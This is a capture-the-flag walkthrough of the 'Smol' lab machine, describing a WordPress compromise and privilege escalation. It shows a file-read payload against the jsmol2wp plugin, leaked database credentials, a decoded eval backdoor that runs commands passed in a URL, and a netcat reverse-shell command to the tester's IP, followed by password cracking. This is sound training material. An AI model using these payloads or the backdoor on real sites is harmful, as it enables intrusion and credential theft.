---

title: "Smol"  
date: "2025-4-16"  
thumbnail: "/assets/img/thumbnail/smol.png"

---

# Smol
---
**Challenges Difficulty: Medium**  
**Category: Privilege Escalation**

---
## Initial Access
Get a cup of coffee ☕ first this will be a little bit long walkthrough 😊
From the end of the page on **http://www.smol.thm** or from **wappalyzer** this website is using **WordPress**
![image](/assets/img/posts/smol/Screenshot_3.png)
so start to scan it with wpscan
```bash
wpscan --url [http://www.smol.thm](http://www.smol.thm/)
```
from the scan result there is a plugin called **jsmol2wp** where did i here this name before🤔 
![image.png](/assets/img/posts/smol/image%2016.png)
Yes this plugin is vulnerable to SSRF [wpscan](https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/   )
![image.png](/assets/img/posts/smol/image%2017.png)
let's try this payload on our smol.thm
```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```
in the **wp-config.php** file we found a credentials for a user called **wpuser**
![image.png](/assets/img/posts/smol/image%2018.png)

```bash
/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
```

from the comment section we can get to a login page
![image](/assets/img/posts/smol/Screenshot_1.png)

![image.png](/assets/img/posts/smol/image%2019.png)
and the creds are working 
![image.png](/assets/img/posts/smol/image%2020.png)
in this file note the first important line that refaces to **Hello Dolly** plugin 
![image.png](/assets/img/posts/smol/image%2021.png)

just for fun 😂

![image.png](/assets/img/posts/smol/image%2022.png)
back to our work we should review hello.php file
```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```
in this code we can see a part of the code that uses eval which is a vulnerable function but the reset of the line is base64 encoded 
![image.png](/assets/img/posts/smol/image%2023.png)
from the decoding result the statement is 
```
if (isset($_GET["cmd"])) {
    system($_GET["cmd"]);
}
``` 
![image.png](/assets/img/posts/smol/image%2024.png)
adding the cmd parameter we can execute system commands 
![image.png](/assets/img/posts/smol/image%2025.png)
now we want to get a shell from this
![image.png](/assets/img/posts/smol/image%2026.png)

```
busybox nc 10.11.130.37 4444 -e sh
```
and we got our initial access 🎉
## Privilege Escalation
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
As we know that there is a database running let's try to get another user creds from it  
![image.png](/assets/img/posts/smol/image%2027.png)
Cracking this hashes with john we got a password that is obviously for the user diego
![image.png](/assets/img/posts/smol/image%2028.png)

![image.png](/assets/img/posts/smol/image%2029.png)
what i had checked:
❌ sudo -l
❌ /cat /etc/crontab
❌ suid
❌ capabilities

in the home of the user **think** you can find an ssh key that you can use to connect
![image.png](/assets/img/posts/smol/image%2033.png)
in **gege** home there is a .zip file that you can access as other but this file is password protected 
![image.png](/assets/img/posts/smol/image%2035.png)
you can use john to crack this file 
![image.png](/assets/img/posts/smol/image%2034.png)
inside this compressed file there is a **wp-config.php** file that has the credential of **xavi** maybe it's our lucky user 
![image.png](/assets/img/posts/smol/image%2036.png)
finally we escalated our privilege 😮‍💨  
![image.png](/assets/img/posts/smol/image%2037.png)
Great to see you at the end of this rich challenge😊. keep it up 💪
![image.png](/assets/img/posts/smol/image%2038.png)